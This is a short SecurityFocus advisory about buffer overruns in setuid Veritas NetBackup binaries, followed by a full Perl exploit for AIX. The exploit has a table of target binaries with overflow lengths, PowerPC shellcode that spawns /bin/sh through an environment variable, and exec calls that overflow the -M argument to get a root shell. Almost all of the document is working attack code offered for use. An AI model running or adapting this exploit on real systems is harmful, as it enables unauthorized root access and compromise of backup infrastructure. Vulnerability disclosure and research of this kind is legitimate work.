source: http://www.securityfocus.com/bid/10226/info
 
Multiple unspecified local buffer overrun and format string vulnerabilities have been reported to exist in various setuid Veritas NetBackup binaries. These issues may be exploited to execute arbitrary code with root privileges.
 
It should be noted that these issues are confirmed to exist and be exploitable on Linux platforms, however, releases of the software on other Unix-based platforms are also believed to be similarly affected.
 
It is also not known at this point which specific NetBackup releases or distributions are affected.

#!/usr/bin/perl -w
#
# Veritas Netbackup 4.x and 5.x hostname overflow
#
# kf (kf_lists[at]secnetops[dot]com) - 04/25/2004
#
# This bug has not been patched as of:
# VERSION NetBackup 5.0GA
#
# /usr/openv/netbackup/bin/nonroot_admin *MUST have been run*
# if not the setuids do NOT exist
#
# AIX Version
# Starting program: /usr/openv/bperror -M `perl -e 'print "A" x 308'`ABCD
# Program received signal SIGSEGV, Segmentation fault.
# 0x41424344 in ?? ()
#

$retval = 0x2ff22dff;

$tgts{"0"} = "/usr/openv/netbackup/bin/admincmd/bperror:308";
$tgts{"1"} = "/usr/openv/netbackup/bin/admincmd/bpretlevel:280";
$tgts{"2"} = "/usr/openv/netbackup/bin/admincmd/bpclinfo:284";
$tgts{"3"} = "/usr/openv/netbackup/bin/admincmd/bpauthorize:4700";
$tgts{"4"} = "/usr/openv/netbackup/bin/admincmd/bprdreq:560";
unless (($target,$offset) = @ARGV) {

        print "\n        Veritas Netbackup hostname overflow, kf \(kf_lists[at]secnetops[dot]com\) - 04/25/2004\n";
        print "Modded for AIX 50L\n";
        print "\n\nUsage: $0 <target> <offset> \n\nTargets:\n\n";

        foreach $key (sort(keys %tgts)) {
                ($a,$b) = split(/\:/,$tgts{"$key"});
                print "\t$key. $a . $b \n";
        }

        print "\n";
        exit 1;
}

$ret = pack("l", ($retval+$offset));
($a,$b) = split(/\:/,$tgts{"$target"});
print "*** Target: $a, Len: $b, Offset: $offset, Ret: $ret ***\n\n";

$sc = "\x7c\xa5\x2a\x79" x 20;
$sc .= "\x7e\x94\xa2\x79\x40\x82\xff\xfd\x7e\xa8\x02\xa6\x3a\xb5\x01\x40";
$sc .= "\x88\x55\xfe\xe0\x7e\x83\xa3\x78\x3a\xd5\xfe\xe4\x7e\xc8\x03\xa6";
$sc .= "\x4c\xc6\x33\x42\x44\xff\xff\x02\xb6\x05\xff\xff\x7e\x94\xa2\x79";
$sc .= "\x7e\x84\xa3\x78\x40\x82\xff\xfd\x7e\xa8\x02\xa6\x3a\xb5\x01\x40";
$sc .= "\x88\x55\xfe\xe0\x7e\x83\xa3\x78\x3a\xd5\xfe\xe4\x7e\xc8\x03\xa6";
$sc .= "\x4c\xc6\x33\x42\x44\xff\xff\x02\xb7\x05\xff\xff\x38\x75\xff\x04";
$sc .= "\x38\x95\xff\x0c\x7e\x85\xa3\x78\x90\x75\xff\x0c\x92\x95\xff\x10";
$sc .= "\x88\x55\xfe\xe1\x9a\x95\xff\x0b\x4b\xff\xff\xd8/bin/sh";

$ENV{"ENV"} = "";

$ENV{"SNO"} = $sc;

$buf = "A" x $b;
$buf .= "$ret";

if ($target eq 0) {
exec("/usr/openv/netbackup/bin/admincmd/bperror -M $buf");
}
if ($target eq 1) {
exec("/usr/openv/netbackup/bin/admincmd/bpretlevel -M $buf");
}
if ($target eq 2) {
exec("/usr/openv/netbackup/bin/admincmd/bpclinfo class_name -set -M $buf");
}
if ($target eq 3) {
exec("/usr/openv/netbackup/bin/admincmd/bpauthorize -M $buf");
}
if ($target eq 4) {
exec("/usr/openv/netbackup/bin/admincmd/bprdreq  -M $buf");
}